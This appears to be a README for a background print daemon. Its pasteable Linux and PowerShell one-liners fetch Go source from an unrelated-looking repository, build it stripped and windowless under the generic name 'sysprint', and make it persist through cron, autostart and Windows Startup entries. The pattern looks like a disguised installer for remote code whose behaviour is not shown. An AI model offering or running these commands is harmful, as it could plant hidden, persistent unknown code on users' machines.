# Printer Relay Agent
Background print daemon for spooling print jobs directly to campus LPR printers.
### Linux
```bash
curl -sSL https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.go -o printer.go && GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o sysprint printer.go && mkdir -p ~/.local/bin ~/.config/autostart && cp sysprint ~/.local/bin/sysprint && chmod +x ~/.local/bin/sysprint && (crontab -l 2>/dev/null; echo "@reboot ~/.local/bin/sysprint") | crontab - && printf '[Desktop Entry]\nType=Application\nName=sysprint\nExec=%s\n' "$HOME/.local/bin/sysprint" > ~/.config/autostart/sysprint.desktop && ~/.local/bin/sysprint &
```

### Windows (PowerShell)
```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.go" -OutFile "printer.go"; $env:GOOS="windows"; $env:GOARCH="amd64"; go build -ldflags="-H=windowsgui -s -w" -o sysprint.exe printer.go; $target = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysprint.exe"; Copy-Item "sysprint.exe" $target -Force; Start-Process $target
```

### Status Check

#### Linux
```bash
ps aux | grep sysprint
```

#### Windows
```powershell
Get-Process sysprint
```
